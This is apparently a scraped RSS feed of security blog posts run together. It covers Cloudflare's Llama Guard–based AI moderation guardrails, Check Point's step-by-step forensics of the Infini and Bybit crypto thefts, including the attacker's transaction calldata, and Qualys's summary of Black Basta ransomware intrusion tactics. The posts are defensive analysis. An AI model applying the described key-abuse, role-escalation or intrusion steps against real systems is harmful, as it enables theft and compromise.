application.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;The challenge&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-challenge"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Developers building AI applications today face a complex set of challenges, hindering their ability to create safe and reliable experiences:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Inconsistency across models: &lt;/b&gt;The rapid advancement of AI models and providers often leads to varying built-in safety features. This inconsistency arises because different AI companies have unique philosophies, risk tolerances, and regulatory requirements. Some models prioritize openness and flexibility, while others enforce stricter moderation based on ethical and legal considerations. Factors such as company policies, regional compliance laws, fine-tuning methods, and intended use cases all contribute to these differences, making it difficult for developers to deliver a uniformly safe experience across different model providers.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Lack of visibility into unsafe or inappropriate content: &lt;/b&gt;Without proper tools, developers struggle to monitor user inputs and model outputs, making it challenging to identify and manage harmful or inappropriate content effectively when trying out different models and providers.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The answer? A standardized, provider-agnostic solution that offers comprehensive observability and logs in one unified interface, along with granular control over content moderation.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;The solution: Guardrails in AI Gateway&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-solution-guardrails-in-ai-gateway"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;&lt;a href="https://developers.cloudflare.com/ai-gateway/"&gt;&lt;u&gt;AI Gateway&lt;/u&gt;&lt;/a&gt; is a proxy service that sits between your AI application and its model providers (like OpenAI, Anthropic, DeepSeek, &lt;a href="https://developers.cloudflare.com/ai-gateway/providers/"&gt;&lt;u&gt;and more&lt;/u&gt;&lt;/a&gt;). To address the challenges of deploying AI safely, AI Gateway has added safety guardrails which ensure a consistent and safe experience, regardless of the model or provider you use.&lt;/p&gt;&lt;p&gt;AI Gateway gives you visibility into what users are asking, and how models are responding, through its detailed logs. This real-time observability actively monitors and assesses content, enabling proactive identification of potential issues. The Guardrails feature offers granular control over content evaluation and actions taken. Customers can define precisely which interactions to evaluate — user prompts, model responses, or both, and specify corresponding actions, including ignoring, flagging, or blocking, based on pre-defined hazard categories.&lt;/p&gt;&lt;p&gt;Integrating Guardrails is streamlined within AI Gateway, making implementation straightforward. Rather than manually calling a moderation tool, configuring flows, and managing flagging/blocking logic, you can enable Guardrails directly from your AI Gateway settings with just a few clicks. &lt;/p&gt;
          &lt;figure&gt;

AI Gateway settings with Guardrails turned on, displaying selected hazard categories for prompts and responses, with flagged categories in orange and blocked categories in red&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Within the AI Gateway settings, developers can configure:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Guardrails&lt;/b&gt;: Enable or disable content moderation as needed.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Evaluation scope&lt;/b&gt;: Select whether to moderate user prompts, model responses, or both.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Hazard categories&lt;/b&gt;: Specify which categories to monitor and determine whether detected inappropriate content should be blocked or flagged.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3QnhWk1vn1SvFsKICvb9Rd/99f0cfc6e62b1f70db1d102277d73f83/image9.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Figure 2. Advanced settings of Guardrails with granular moderation controls for different hazard categories&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;By implementing these guardrails within AI Gateway, developers can focus on innovation, knowing that risks are proactively mitigated and their AI applications are operating responsibly.&lt;/p&gt;&lt;h4&gt;Leveraging Llama Guard on Workers AI&lt;/h4&gt;&lt;p&gt;The Guardrails feature is currently powered by &lt;a href="https://ai.meta.com/research/publications/llama-guard-llm-based-input-output-safeguard-for-human-ai-conversations/"&gt;&lt;u&gt;Llama Guard&lt;/u&gt;&lt;/a&gt;, Meta’s open-source content moderation and safety tool, designed to detect harmful or unsafe content in both user inputs and AI-generated outputs. It provides real-time filtering and monitoring, ensuring responsible AI usage, reducing risk, and improving trust in AI-driven applications. Notably, organizations like &lt;a href="https://mlcommons.org/"&gt;&lt;u&gt;ML Commons&lt;/u&gt;&lt;/a&gt; use Llama Guard to evaluate the safety of foundation models. &lt;/p&gt;&lt;p&gt;Llama Guard can be used to provide protection over a wide range of content such as violence and sexually explicit material. It also helps you safeguard sensitive data as outlined in the OWASP, like addresses, Social Security numbers, and credit card details. Specifically, Guardrails on AI Gateway utilizes the &lt;a href="https://github.com/meta-llama/PurpleLlama/blob/main/Llama-Guard3/8B/MODEL_CARD.md"&gt;&lt;u&gt;Llama Guard 3 8B&lt;/u&gt;&lt;/a&gt; model hosted on &lt;a href="https://developers.cloudflare.com/workers-ai/"&gt;&lt;u&gt;Workers AI&lt;/u&gt;&lt;/a&gt; — Cloudflare’s serverless, GPU-powered inference engine. Workers AI is uniquely qualified for this task because it operates on GPUs distributed across Cloudflare’s network, ensuring low-latency inference and rapid content evaluation. We plan to add additional models to power the Guardrails feature to Workers AI in the future. &lt;/p&gt;&lt;p&gt;Using Guardrails incurs &lt;a href="https://developers.cloudflare.com/workers-ai/models/llama-guard-3-8b/"&gt;&lt;u&gt;Workers AI usage&lt;/u&gt;&lt;/a&gt;, and that usage is reflected in your &lt;a href="https://dash.cloudflare.com/?to=/:account/ai/workers-ai"&gt;&lt;u&gt;Workers AI dashboard&lt;/u&gt;&lt;/a&gt;, allowing developers to track their inference consumption effectively. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;How it works &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-it-works"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Functioning as a proxy between users and AI models, AI Gateway intercepts and inspects all interactions—both user prompts and model responses—for potentially harmful content.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/kzup1z7NTP4qkMXWgh8ns/b85afdfd8328f0f8c28e42058c305ecb/image5.jpg" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Figure 3. Workflow diagram of Guardrails in AI Gateway, illustrating how prompts and responses are evaluated, along with the outcomes when content is deemed safe or unsafe&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;When a user enters a prompt, AI Gateway runs that prompt through Llama Guard on Workers AI. Behind the scenes, AI Gateway utilizes the &lt;a href="https://developers.cloudflare.com/ai-gateway/integrations/worker-binding-methods/"&gt;&lt;u&gt;AI Binding&lt;/u&gt;&lt;/a&gt;, making it seamless to connect AI Gateway to Cloudflare &lt;a href="https://developers.cloudflare.com/workers/"&gt;&lt;u&gt;Workers&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://developers.cloudflare.com/workers-ai/"&gt;&lt;u&gt;Workers AI&lt;/u&gt;&lt;/a&gt;. To provide better observability, requests to Workers AI through AI Gateway all include the &lt;code&gt;eventID&lt;/code&gt; from the original request. This ensures that each request can be linked to its corresponding safety evaluations, allowing for efficient log grouping and traceability of AI interactions. &lt;/p&gt;&lt;p&gt;Depending on the configured settings, AI Gateway can either flag the prompt while still allowing the request to pass through to the AI model, or block the prompt entirely, preventing it from reaching the model. Blocking harmful prompts in this way not only enhances safety, but also reduces costs by preventing unnecessary processing and token consumption. If a prompt passes the safety check, it’s forwarded to the AI model.&lt;/p&gt;&lt;p&gt;Let’s see an example of a prompt blocked by Guardrails. In this example, the Guardrails settings have been turned on for user prompts and configured to block for multiple categories, including “Non-Violent Crimes”. The user has asked OpenAI’s &lt;code&gt;gpt-4o-mini &lt;/code&gt;model to “Teach me how to steal company data without being detected”. Instead of returning a response from the model, Guardrails has identified this prompt to include content around “Non-Violent Crimes” and blocked it, returning the message “Prompt blocked due to security configurations”. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/67JO7yPZ1gXOyX8u6Cx7CN/09b8ae7c7080fe7ada50bab70de4ead9/image9.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Figure 4. AI Gateway log displaying a blocked prompt classified under “Non-Violent Crimes”, with an error message indicating the prompt was blocked due to security configurations&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;AI Gateway determined this prompt was unsafe because the response from Workers AI Llama Guard indicated that category S2, Non-Violent Crimes, was &lt;code&gt;safe: false&lt;/code&gt;. Since Guardrails was configured to block when the “Non-Violent Crimes” hazard category was detected, AI Gateway failed the request and did not send it to OpenAI. As a result, the request was unsuccessful and no token usage was incurred.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3U401FlyK3XxiySamMfNZv/0a25e547a247f352675f2d9bf4fdb9e0/image4.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Figure 5. Guardrails log of a Llama Guard 3 8B request from Workers AI, flagging category S2, as Non-Violent Crimes, with the response indicating safe: false&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;AI Gateway also inspects AI model responses before they reach the user, again evaluating them against the configured safety settings. Safe responses are delivered to the user. However, if any hazardous content is detected, the response is either flagged or blocked and logged in AI Gateway. &lt;/p&gt;&lt;p&gt;AI Gateway leverages specialized AI models trained to recognize various forms of harmful content to ensure only safe and appropriate information is shown to users. Currently, Guardrails only works with text-based AI models. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Deploy with confidence&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#deploy-with-confidence"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Safely deploying AI in today’s dynamic landscape requires acknowledging that while AI models are powerful, they are also inherently non-deterministic. By leveraging Guardrails within AI Gateway, you gain:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Consistent moderation&lt;/b&gt;: Uniform moderation layer that works across models and providers.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Enhanced safety and user trust&lt;/b&gt;: Proactively protect users from harmful or inappropriate interactions.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Flexibility and control over allowed content: &lt;/b&gt;Specify which categories to monitor and choose between flagging or outright blocking&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Auditing and compliance capabilities&lt;/b&gt;: Stay ahead of evolving regulatory requirements with logs of user prompts, model responses, and enforced guardrails.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;If you aren't yet using AI Gateway, Llama Guard is also available directly through Workers AI and will be available directly in the Cloudflare WAF in the near future. &lt;/p&gt;&lt;p&gt;Looking ahead, we plan to expand Guardrails’ capabilities further, to allow users to create their own classification categories, and to include protections against prompt injection and sensitive data exposure.

&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/how-an-attacker-drained-50m-from-a-defi-protocol-through-role-escalation/"&gt;How an Attacker Drained $50M from a DeFi Protocol Through Role Escalation &lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;&lt;em&gt;By: Dikla Barda, Roaman Zaikin &amp;amp; Oded Vanunu&amp;nbsp;&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;After reviewing the off-chain &lt;a href="https://docsend.com/view/s/rmdi832mpt8u93s7"&gt;forensic report&lt;/a&gt;, we can now provide additional insights into the Bybit attack&lt;br /&gt;mechanism.&lt;/p&gt;



&lt;p&gt;Security researchers have determined that hackers injected malicious JavaScript directly into Safe&amp;#8217;s&lt;br /&gt;online infrastructure hosted on AWS. The code was specifically designed to activate only when&lt;br /&gt;interacting with Bybit&amp;#8217;s contract address, allowing it to remain undetected by regular users.&lt;br /&gt;The JavaScript manipulation modified transaction data behind the scenes:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;When Bybit signers accessed the interface, the code identified target addresses&lt;/li&gt;
&lt;/ul&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;It silently modified critical transaction parameters including recipient address and operation&lt;br /&gt;type&lt;/li&gt;



&lt;li&gt;It preserved the appearance of legitimacy by displaying the original transaction details to signers&lt;br /&gt;Just two minutes after successfully draining $1.4 billion in assets, the hackers removed all traces of themalicious code from Safe&amp;#8217;s infrastructure.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;This finding confirms our assessment that this attack sets a new precedent in crypto security by&lt;br /&gt;bypassing a multisig cold wallet through sophisticated UI manipulation, further proving that multisigs&lt;br /&gt;and cold wallets are not automatically secure when the interface layer can be compromised.&lt;/p&gt;



&lt;p&gt;On February 21, Check Point Blockchain Threat Intel System observed a sophisticated attack on a DeFi protocol, &lt;strong&gt;Infini&lt;/strong&gt;. &lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-31185" height="367" src="https://research.checkpoint.com/wp-content/uploads/2025/02/image-3-1024x367.png" width="1024" /&gt;&lt;/figure&gt;



&lt;p&gt;Infini is a digital banking platform in the crypto space that offers its users savings yields and other financial services. The platform aims to make crypto assets more accessible practical for everyday transactions.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Unfortunately, this project recently suffered a security breach that targeted its yield management system, resulting in the loss of approximately 50 million USDC. The attacker exploited compromised private keys, carefully manipulated access controls, and executed a precise sequence of transactions to drain funds.&amp;nbsp;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Here, we’ll break down the heist step by step. &lt;/p&gt;



&lt;p&gt;&lt;strong&gt;The Compromised Private Key&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;The attack began with transactions&amp;nbsp; from address 0xc49b5e5B9DA66B9126c1a62e9761E6b2147DE3E1, which held administrative privileges in the protocol. Infini has stated that they believe this private key may have been compromised.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Private key security is one of the most challenging aspects of blockchain security. Even with best practices in place, sophisticated attackers can sometimes gain access through various vectors, including phishing, malware, or other techniques. Without a full investigation, it&amp;#8217;s premature to draw conclude exactly how the administrative access was obtained.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;With this key, the attacker could sign transactions as if they were the legitimate owners—a critical first step that gave them initial access to the protocol.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Exploiting the Role-Based Access Control System&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Looking at the decompiled contract code, we can see the core function that determines role authorization:&amp;nbsp;&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-31181" height="71" src="https://research.checkpoint.com/wp-content/uploads/2025/02/image-1024x71.png" width="1024" /&gt;&lt;/figure&gt;



&lt;p&gt;The compromised address&amp;nbsp; had admin privileges, which allowed the attacker to grant the REDEEMER_ROLE to themselves using the stolen key.&amp;nbsp;&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-31183" height="182" src="https://research.checkpoint.com/wp-content/uploads/2025/02/image-1.png" width="750" /&gt;&lt;/figure&gt;



&lt;p&gt;&lt;strong&gt;Setting Up the Extraction Path&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Before funds could be withdrawn, the attacker needed to register their address as a valid destination. Looking at the contract code, we can see the critical function:&amp;nbsp;&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-31182" height="71" src="https://research.checkpoint.com/wp-content/uploads/2025/02/image-1024x71.png" width="1024" /&gt;&lt;/figure&gt;



&lt;p&gt;This function registers an address in the map_4 mapping, which the withdrawal function checks during execution.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;The attacker used the compromised key to call this function and register their address as a valid destination, setting up the path for the funds to exit the protocol.&amp;nbsp;&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-31184" height="851" src="https://research.checkpoint.com/wp-content/uploads/2025/02/image-2-1024x851.png" width="1024" /&gt;&lt;/figure&gt;



&lt;p&gt;&lt;strong&gt;The Withdrawal Function&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;The heart of this exploit was the ability to call the token redemption function, which has the hex signature 0xcfda09ef. Let&amp;#8217;s examine this critical function:&amp;nbsp;&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-31187" height="905" src="https://research.checkpoint.com/wp-content/uploads/2025/02/image-5-1024x905.png" width="1024" /&gt;&lt;/figure&gt;



&lt;p&gt;This function works by:&amp;nbsp;&lt;/p&gt;



&lt;ol class="wp-block-list" start="1"&gt;
&lt;li&gt;Checking that the caller has the REDEEMER_ROLE&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="2"&gt;
&lt;li&gt;Verifying the token is valid, and the destination is registered&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="3"&gt;
&lt;li&gt;Checking if the contract has enough tokens directly&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="4"&gt;
&lt;li&gt;If not, pulling tokens from the specified strategy&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="5"&gt;
&lt;li&gt;Finally, transferring tokens to the destination address&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;With the REDEEMER_ROLE and their address registered in map_4, the attacker could now call this function to drain funds to their&amp;nbsp; wallet.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;The Execution&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;The attack culminated in a transaction that called the 0xcfda09ef function with these parameters:&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Copy&amp;nbsp;&lt;/p&gt;



&lt;p&gt;0xcfda09ef000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000000000000000000000000000000000229dc42982570000000000000000000000003ac96134fb0e42a52d33045aee50b89790f05ed0000000000000000000000000e0e83f21d5b6da61c9cf75d3b89fbcacfbfde32700000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000000&amp;nbsp;&lt;/p&gt;



&lt;p&gt;When decoded:&amp;nbsp;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Token: 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48 (USDC)&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Amount: 0x0000000000000000000000000000000000000000000000000000229dc4298257&amp;nbsp;&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Destination: 0x3ac96134fb0e42a52d33045aee50b89790f05ed0 (Attacker-controlled)&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Strategy: 0x0e0e83f21d5b6da61c9cf75d3b89fbcacfbfde327 (Yield strategy holding funds)&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Extra data: Empty byte array&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;The Bounty Offer&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Following the attack, Infini took an approach that has become increasingly common in the DeFi space. The protocol team sent an on-chain message to the attacker, offering a bounty of 20% of the stolen funds (approximately 10 million USDC) if the remaining funds were returned.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;The message was embedded in a transaction to the attacker&amp;#8217;s wallet and read:&amp;nbsp;&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-31186" height="372" src="https://research.checkpoint.com/wp-content/uploads/2025/02/image-4-1024x372.png" width="1024" /&gt;&lt;/figure&gt;



&lt;p&gt;This approach, sometimes called a &amp;#8220;white hat agreement&amp;#8221; or &amp;#8220;bug bounty after the fact,&amp;#8221; has occasionally been successful in recovering funds from attacks where the exploiter is primarily motivated by financial gain rather than causing harm to the protocol. The strategy acknowledges that legal recovery of crypto assets can be difficult and time-consuming, while offering the attacker a legitimate way to profit from their discovery without risking legal consequences.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;As of the time of writing, it remains to be seen whether the attacker will accept this offer.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Security Lessons&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;This attack highlights several critical security considerations for DeFi protocols:&amp;nbsp;&lt;/p&gt;



&lt;ol class="wp-block-list" start="1"&gt;
&lt;li&gt;&lt;strong&gt;Private Key Security&lt;/strong&gt;: This compromise was caused by a stolen private key. Hardware wallets, multi-signature schemes, and proper key management are essential.&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="2"&gt;
&lt;li&gt;&lt;strong&gt;Role Separation&lt;/strong&gt;: The compromised account had both administrative access to grant roles and could add destination addresses. Better separation of duties might have mitigated the impact.&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="3"&gt;
&lt;li&gt;&lt;strong&gt;Time-Locks and Monitoring&lt;/strong&gt;: Implementation of time-locks for sensitive operations and active monitoring could have detected and potentially prevented the attack before completion.&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="4"&gt;
&lt;li&gt;&lt;strong&gt;Withdrawal Limits&lt;/strong&gt;: The protocol lacked maximum withdrawal limits, allowing the attacker to drain funds in a single transaction.&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;This case study demonstrates how seemingly isolated security vulnerabilities can be chained together into devastating attacks. The attacker methodically:&amp;nbsp;&lt;/p&gt;



&lt;ol class="wp-block-list" start="1"&gt;
&lt;li&gt;Obtained a private key with administrative privileges&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="2"&gt;
&lt;li&gt;Granted themselves the REDEEMER_ROLE&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="3"&gt;
&lt;li&gt;Registered their address as a valid destination&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="4"&gt;
&lt;li&gt;Called the withdrawal function to drain approximately 50 million USDC&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Each step built upon the previous one, ultimately leading to a complete protocol compromise. While the code contained various security checks, the fundamental issue was that once the private key was compromised, the role-based system could be manipulated from within.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;This attack reinforces that security is only as strong as its weakest link, and sophisticated attackers will exploit multiple small vulnerabilities to achieve their goals.&amp;nbsp;&lt;/p&gt;

Triggered by internal conflicts and a retaliatory data dump following attacks on Russian banks, the exposed records offer a rare glimpse into Black Basta’s tactics, operations, and leadership.&lt;/p&gt;



&lt;p&gt;We’ve analyzed these newly unveiled tactics, and in this blog, we equip security teams with clear, actionable insights. We aim to highlight the key lessons learned—like immediate patching, tighter access controls, and rapid incident response—and provide an urgent call to action. This practical guide aims to help organizations strengthen their defenses against evolving ransomware threats and mitigate potential damage.&lt;/p&gt;



&lt;span id="more-37340"&gt;&lt;/span&gt;



&lt;h2 class="wp-block-heading" id="know-your-enemys-playbook"&gt;&lt;strong&gt;Know Your Enemy’s Playbook&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;Understanding Black Basta’s attack tactics is critical for enterprises seeking to fortify their defenses. The Black Basta ransomware group leverages known vulnerabilities, misconfigurations, and insufficient security controls to breach systems. Their internal discussions reveal active targeting of exposed RDP servers, weak authentication mechanisms, and the deployment of malware droppers disguised as legitimate files​​.&lt;/p&gt;



&lt;p&gt;Key attack vectors used by Black Basta include scanning for exposed RDP and VPN services—often relying on default VPN credentials or brute-forcing stolen credentials to gain initial access—and exploiting publicly known CVEs when systems remain unpatched. MSI and VBS-based malware droppers are frequently utilized to deliver malicious payloads, with Rundll32.exe leveraged to execute harmful DLLs. Credential harvesting and privilege escalation are also central to these tactics.&lt;/p&gt;

&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;The Initial Access Problem&lt;/strong&gt;&lt;strong&gt;&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;Black Basta employs a layered approach involving credential theft, service exploitation (such as RDP brute force), social engineering, and persistence. They obtain credentials through phishing, supply chain compromises, dark web purchases, and by locating exposed services using tools like Shodan or Fofa (automated scanners), followed by brute-force attacks on accessible login portals (e.g., RDP). Internal communications confirm multiple tactics for establishing an initial foothold. This layered approach includes:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Exploitation of Exposed Services &amp;amp; Misconfigurations: &lt;/strong&gt;They aggressively search for internet-facing vulnerabilities, particularly in Jenkins CI/CD instances, VMware ESXi hosts, Citrix gateways, and VPNs with weak credentials. &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Abuse of Third-Party Services for Payload Hosting: &lt;/strong&gt;To evade detection, they rely on legitimate file-sharing platforms like transfer.sh, temp.sh, and send.vis.ee for hosting malicious payloads, reducing the need for custom infrastructure.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Data Exfiltration, Social Engineering, and Voice Phishing: &lt;/strong&gt;Before deploying ransomware, they archive and extract entire file directories. Internal chats mention targeting legal and financial documents and using custom-built tool to automate data extraction. Beyond email phishing, Black Basta members impersonate IT support staff via phone calls, tricking employees into revealing credentials.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="attackers-move-fast"&gt;&lt;strong&gt;Attackers Move Fast&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;Ransomware groups are no longer taking their time once they breach an organization’s network. Recently leaked data from Black Basta shows they’re moving from initial access to network-wide compromise within hours—sometimes even minutes.&lt;/p&gt;



&lt;p&gt;Ransomware operators are accelerating their attacks, leaving organizations with little time to respond. To prevent widespread damage, it’s critical to proactively detect known exploited vulnerabilities and minimize the attack surface. The longer you wait, the more likely attackers will exfiltrate data and lock down your environment. In many cases, automated scripts run post-exploitation tasks such as dumping credentials, disabling security tools, and deploying ransomware.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="how-qualys-can-help"&gt;&lt;strong&gt;How Qualys Can Help&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;The recent leak of the Black Basta ransomware group’s internal chat logs has provided unprecedented insights into its operations, tools, and tactics. Qualys’ product suite aligns perfectly with the critical recommendations we’ve highlighted, offering a unified approach to cybersecurity.&lt;br /&gt;&lt;br /&gt;See instances of the Black Basta&amp;#8217;s top exploited vulnerabilities in your environment.

&lt;blockquote&gt;&lt;p&gt;Bybit officials &lt;a href="https://announcements.bybit.com/article/incident-update---eth-cold-wallet-incident-blt292c0454d26e9140/"&gt;disclosed&lt;/a&gt; the theft of more than 400,000 ethereum and staked ethereum coins just hours after it occurred.

&lt;p&gt;The announcement on the Bybit website is almost comical. This is the headline: &amp;#8220;Incident Update: Unauthorized Activity Involving ETH Cold Wallet.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://research.checkpoint.com/2025/the-bybit-incident-when-research-meets-reality/"&gt;More&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;This hack sets a new precedent in crypto security by bypassing a multisig cold wallet without exploiting any smart contract vulnerability. Instead, it exploited human trust and UI deception:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Multisigs are no longer a security guarantee if signers can be compromised.
&lt;li&gt;Cold wallets aren&amp;#8217;t automatically safe if an attacker can manipulate what a signer sees.
&lt;li&gt;Supply chain and UI manipulation attacks are becoming more sophisticated.&lt;/ul&gt;
&lt;p&gt;The Bybit hack has shattered long-held assumptions about crypto security. No matter how strong your smart contract logic or multisig protections are, the human element remains the weakest link. This attack proves that UI manipulation and social engineering can bypass even the most secure wallets. The industry needs to move to end to end prevention, each transaction must be validated.&lt;/p&gt;&lt;/blockquote&gt;</content:encoded><guid isPermaLink="false">https://www.schneier.com/?p=69956</guid><category>Uncategorized</category><category>cryptocurrency</category><category>hacking</category><category>North Korea</category><category>theft</category></item><item><title>Qualys TotalCloud KCS Achieves Red Hat Vulnerability Scanner Certification</title><link>https://blog.qualys.com/category/product-tech</link><description>We’re excited to announce that Qualys TotalCloud Kubernetes and Container Security (KCS) has achieved the Red Hat Vulnerability Scanning Certification, reinforcing our commitment to unbiased, 6-sigma accurate vulnerability detection.

By meeting Red Hat’s rigorous security standards, Qualys TotalCloud KCS extends its industry-leading accuracy across Red Hat OpenShift, Quay.io, RHEL, and CoreOS—critical components in modern cloud-native and containerized environments.&lt;/p&gt;



&lt;span id="more-37326"&gt;&lt;/span&gt;



